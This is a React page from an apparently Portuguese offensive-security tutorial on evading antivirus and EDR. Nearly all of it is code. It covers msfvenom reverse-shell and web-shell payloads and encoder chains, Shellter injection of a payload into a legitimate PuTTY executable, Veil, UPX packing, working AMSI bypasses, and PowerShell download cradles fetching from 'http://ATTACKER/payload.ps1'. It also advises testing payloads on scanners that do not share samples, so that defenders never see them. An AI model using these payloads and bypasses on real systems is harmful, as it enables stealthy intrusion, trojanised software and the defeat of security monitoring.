import { PageContainer } from "@/components/layout/PageContainer";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { AlertBox } from "@/components/ui/AlertBox";

export default function PayloadObfuscation() {
  return (
    <PageContainer
      title="Ofuscação de Payloads — Evasão de Antivírus e EDR"
      subtitle="Técnicas para evitar detecção por antivírus, EDR e IDS/IPS. Inclui encoding, criptografia de payloads, empacotamento, AMSI bypass, e uso de Veil, Shellter e msfvenom."
      difficulty="avancado"
      timeToRead="30 min"
    >
      <h2>Por que Ofuscar Payloads?</h2>
      <p>
        Ferramentas como Metasploit geram payloads que são <strong>imediatamente detectados</strong> por
        qualquer antivírus moderno. Sem ofuscação, seu payload será bloqueado antes de executar.
        Ofuscação modifica a aparência do payload sem mudar sua funcionalidade, evitando
        detecção baseada em assinaturas.
      </p>

      <AlertBox type="info" title="Detecção moderna é multicamada">
        AV modernos usam: assinaturas estáticas (hash do arquivo), heurística (comportamento suspeito),
        sandboxing (executa em VM), AMSI (scan de scripts em memória), e EDR (monitoramento contínuo).
        Evadir requer combinar MÚLTIPLAS técnicas.
      </AlertBox>

      <h2>msfvenom — Geração e Encoding de Payloads</h2>
      <CodeBlock
        title="Flags, encoders e formatos do msfvenom explicados"
        code={`# ═══════════════════════════════════════════════════
# SINTAXE BÁSICA DO MSFVENOM
# ═══════════════════════════════════════════════════
msfvenom -p PAYLOAD OPCOES -f FORMATO -o ARQUIVO
#
# FLAGS PRINCIPAIS:
# -p PAYLOAD      = tipo de payload (ver lista abaixo)
# -f FORMAT       = formato de saída (exe, elf, raw, etc.)
# -o ARQUIVO      = arquivo de saída
# -e ENCODER      = encoder para ofuscação
# -i ITERACOES    = quantas vezes encodar (mais = mais ofuscado)
# -b BAD_CHARS    = bytes a evitar (ex: \\x00 = null byte)
# -a ARCH         = arquitetura (x86, x64)
# --platform      = plataforma (windows, linux)
# -n NOPSLIDE     = adicionar NOP sled (bytes inúteis antes)
# -s TAMANHO      = tamanho máximo do payload
# LHOST           = seu IP (atacante)
# LPORT           = sua porta (atacante)

# ═══════════════════════════════════════════════════
# PAYLOADS MAIS USADOS
# ═══════════════════════════════════════════════════

# Windows — Meterpreter reverso (MAIS USADO):
msfvenom -p windows/x64/meterpreter/reverse_tcp \\
  LHOST=192.168.1.50 LPORT=4444 \\
  -f exe -o shell.exe
# windows/x64/ = Windows 64-bit
# meterpreter  = shell avançada do Metasploit
# reverse_tcp  = conecta DE VOLTA para o atacante
# -f exe       = executável Windows (.exe)

# Windows — Shell simples:
msfvenom -p windows/x64/shell_reverse_tcp \\
  LHOST=192.168.1.50 LPORT=4444 \\
  -f exe -o shell.exe
# shell_reverse_tcp = cmd.exe reverso (sem Meterpreter)
# Mais simples, menos funcionalidades, mas menor

# Linux — Reverse shell:
msfvenom -p linux/x64/shell_reverse_tcp \\
  LHOST=192.168.1.50 LPORT=4444 \\
  -f elf -o shell.elf
# -f elf = executável Linux

# Web payloads:
msfvenom -p php/reverse_php \\
  LHOST=192.168.1.50 LPORT=4444 \\
  -f raw -o shell.php
# PHP reverse shell para upload em servidor web

msfvenom -p java/jsp_shell_reverse_tcp \\
  LHOST=192.168.1.50 LPORT=4444 \\
  -f war -o shell.war
# WAR file para deploy em Tomcat

# ═══════════════════════════════════════════════════
# FORMATOS DE SAÍDA (-f)
# ═══════════════════════════════════════════════════
# exe       = Executável Windows (.exe)
# elf       = Executável Linux
# macho     = Executável macOS
# dll       = Dynamic Link Library Windows
# msi       = Instalador Windows
# raw       = Shellcode puro (bytes)
# c         = Array em C (unsigned char buf[])
# python    = String Python
# powershell = Script PowerShell
# vba       = Macro VBA (para Word/Excel)
# hta       = HTML Application
# war       = Web Application Archive (Java)
# asp       = ASP Web Shell
# aspx      = ASPX Web Shell
# jar       = Java Archive
# psh       = PowerShell oneliner
# ps1       = Script PowerShell (.ps1)

# ═══════════════════════════════════════════════════
# ENCODERS — OFUSCAÇÃO POR ENCODING
# ═══════════════════════════════════════════════════

# Listar encoders disponíveis:
msfvenom --list encoders
# Rank   Name                          Description
# ───    ───────                       ──────────
# excellent  x86/shikata_ga_nai        Polymorphic XOR Additive Feedback Encoder
# excellent  x64/xor_dynamic           Dynamic XOR encoder
# good       x86/fnstenv_mov           Variable-length XOR Encoder
# good       x86/bloxor               BloXor - A Polymorphic Block Based XOR Encoder
# ...

# ─── shikata_ga_nai (o mais famoso) ──────────────
msfvenom -p windows/x64/meterpreter/reverse_tcp \\
  LHOST=192.168.1.50 LPORT=4444 \\
  -e x86/shikata_ga_nai -i 5 \\
  -f exe -o shell_encoded.exe
# -e x86/shikata_ga_nai = encoder polimórfico XOR
#   "shikata ga nai" = "não tem jeito" em japonês
#   Cada encoding gera resultado DIFERENTE (polimórfico)
#   Dificulta detecção por hash
# -i 5 = encodar 5 vezes (camadas de encoding)
#   Cada iteração wrapa o payload em outra camada
#   Mais iterações = mais ofuscado, mas maior tamanho
#   ⚠️ Após 3-5 iterações, benefício diminui

# Múltiplos encoders em cadeia:
msfvenom -p windows/x64/meterpreter/reverse_tcp \\
  LHOST=192.168.1.50 LPORT=4444 \\
  -e x86/shikata_ga_nai -i 3 \\
  -e x86/fnstenv_mov -i 2 \\
  -f exe -o shell_multi.exe
# Aplica shikata_ga_nai 3x, depois fnstenv_mov 2x

# ─── Evitar bad characters ──────────────────────
msfvenom -p windows/x64/meterpreter/reverse_tcp \\
  LHOST=192.168.1.50 LPORT=4444 \\
  -b '\\x00\\x0a\\x0d' \\
  -f exe -o shell_noBadChars.exe
# -b = bad characters a evitar:
# \\x00 = null byte (termina strings em C)
# \\x0a = line feed (\\n)
# \\x0d = carriage return (\\r)
# O encoder automaticamente gera payload sem esses bytes`}
      />

      <h2>Técnicas Avançadas de Evasão</h2>
      <CodeBlock
        title="Shellter, Veil-Evasion e empacotamento"
        code={`# ═══════════════════════════════════════════════════
# SHELLTER — Injetar payload em EXE legítimo
# ═══════════════════════════════════════════════════
# Shellter pega um .exe LEGÍTIMO (ex: PuTTY, 7zip) e
# injeta seu payload nele. O arquivo continua funcionando
# normalmente + executa o payload em background!
sudo apt install shellter

# Uso (modo automático):
shellter
# [?] Choose Operation Mode [A]uto/[M]anual: A
# [?] PE Target: /path/to/putty.exe        ← EXE legítimo
# [?] Stealth Mode? [Y/N]: Y               ← Manter funcionalidade
# [?] Choose a listed payload or custom: L  ← Usar payload listado
# [?] Select payload index: 1              ← Meterpreter reverse TCP
# [?] SET LHOST: 192.168.1.50
# [?] SET LPORT: 4444
# [+] Injection successful!
#
# Resultado: putty.exe que funciona normalmente
# MAS quando abre, também executa reverse Meterpreter!
# Taxa de evasão: ~60-80% contra AVs

# ═══════════════════════════════════════════════════
# VEIL-EVASION — Gerador de payloads evasivos
# ═══════════════════════════════════════════════════
sudo apt install veil
veil

# Dentro do Veil:
# Veil>: use Evasion
# Veil/Evasion>: list           ← Lista todos os métodos
#
# Métodos disponíveis (exemplo):
# 1) cs/meterpreter/rev_tcp.py    (C# Meterpreter)
# 2) go/meterpreter/rev_tcp.py    (Go Meterpreter)
# 3) python/meterpreter/rev_tcp.py (Python Meterpreter)
# 4) powershell/meterpreter/rev_tcp.py (PS Meterpreter)
# 5) ruby/meterpreter/rev_tcp.py  (Ruby Meterpreter)
#
# Veil/Evasion>: use 2            ← Go (boa evasão)
# [go/meterpreter/rev_tcp]>>: set LHOST 192.168.1.50
# [go/meterpreter/rev_tcp]>>: set LPORT 4444
# [go/meterpreter/rev_tcp]>>: generate
# → Compila executável em Go com payload embutido
# Go binários são grandes (~2-5MB) mas difíceis de analisar

# ═══════════════════════════════════════════════════
# TÉCNICA: EMPACOTADORES (Packers)
# ═══════════════════════════════════════════════════
# Packers comprimem e criptografam o executável.
# O payload é decriptado em runtime (na memória).

# UPX (packer mais básico — pouca evasão):
upx --best shell.exe -o shell_packed.exe
# --best = máxima compressão
# ⚠️ UPX é MUITO conhecido, AVs detectam facilmente
# Usar como camada adicional, não como única proteção

# ═══════════════════════════════════════════════════
# AMSI BYPASS (Anti-Malware Scan Interface)
# ═══════════════════════════════════════════════════
# AMSI é o que permite ao Windows Defender escanear
# scripts PowerShell em MEMÓRIA (antes de executar).
# Sem bypass, qualquer payload PowerShell é detectado.

# Bypass clássico (pode estar patcheado):
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
# Seta amsiInitFailed=true → AMSI "acha" que falhou
# → PowerShell não envia scripts para o AV!

# Bypass ofuscado (evita detecção do bypass):
$a = [Ref].Assembly.GetType('System.Management.Automation.A'+'msiU'+'tils')
$b = $a.GetField('a'+'msiI'+'nitF'+'ailed','NonPublic,Static')
$b.SetValue($null,$true)
# Strings concatenadas para evitar assinatura`}
      />

      <h2>Payload em PowerShell — Técnicas de Evasão</h2>
      <CodeBlock
        title="Gerar e ofuscar payloads PowerShell"
        code={`# ═══════════════════════════════════════════════════
# PAYLOAD POWERSHELL BÁSICO (msfvenom)
# ═══════════════════════════════════════════════════
msfvenom -p windows/x64/meterpreter/reverse_tcp \\
  LHOST=192.168.1.50 LPORT=4444 \\
  -f psh-cmd -o payload.txt
# -f psh-cmd = gera oneliner PowerShell que executa via cmd
# O output é um comando longo encoded em base64

# ═══════════════════════════════════════════════════
# OFUSCAÇÃO MANUAL DE POWERSHELL
# ═══════════════════════════════════════════════════

# Técnica 1: String concatenation
# Original: Invoke-Expression
# Ofuscado:
$x = 'Invoke'+'-Exp'+'ression'
& ($x) "whoami"

# Técnica 2: Base64 encoding
$cmd = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("whoami"))
powershell -EncodedCommand $cmd
# -EncodedCommand aceita base64 direto

# Técnica 3: Variáveis de ambiente como storage
$env:x = "IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/ps.ps1')"
powershell -c "$env:x"

# Técnica 4: Invoke-Obfuscation (ferramenta)
# https://github.com/danielbohannon/Invoke-Obfuscation
Import-Module ./Invoke-Obfuscation.psd1
Invoke-Obfuscation
# SET SCRIPTBLOCK Invoke-Expression (New-Object Net.WebClient).DownloadString('http://...')
# TOKEN\\ALL\\1    → ofusca todos os tokens
# STRING\\1       → ofusca strings
# ENCODING\\1     → encoding ASCII/Base64

# ═══════════════════════════════════════════════════
# DOWNLOAD CRADLES (formas de baixar e executar)
# ═══════════════════════════════════════════════════

# Cradle 1 — Net.WebClient (mais comum, mais detectado):
IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/payload.ps1')
# IEX = Invoke-Expression (executa string como código)
# DownloadString = baixa conteúdo como texto
# → Baixa e executa em memória (sem tocar o disco!)

# Cradle 2 — Invoke-WebRequest (PowerShell 3+):
IEX (Invoke-WebRequest -Uri 'http://ATTACKER/payload.ps1' -UseBasicParsing).Content

# Cradle 3 — System.Net.WebRequest:
$r = [System.Net.WebRequest]::Create('http://ATTACKER/payload.ps1')
IEX ([System.IO.StreamReader]($r.GetResponse().GetResponseStream())).ReadToEnd()

# Cradle 4 — COM Object (mais furtivo):
$ie = New-Object -ComObject InternetExplorer.Application
$ie.Visible = $false
$ie.Navigate('http://ATTACKER/payload.ps1')
while($ie.Busy){Start-Sleep -Milliseconds 100}
IEX $ie.Document.Body.innerText

# ═══════════════════════════════════════════════════
# TESTE DE DETECÇÃO
# ═══════════════════════════════════════════════════
# Testar se o payload é detectado ANTES de enviar ao alvo:
#
# 1. VirusTotal (NÃO USAR para payloads reais!)
#    O VirusTotal COMPARTILHA amostras com os AVs.
#    Seu payload será adicionado às assinaturas!
#
# 2. AntiScan.me — não compartilha amostras
# 3. Kleenscan.com — alternativa
# 4. Testar em VM local com Windows Defender atualizado`}
      />
    </PageContainer>
  );
}
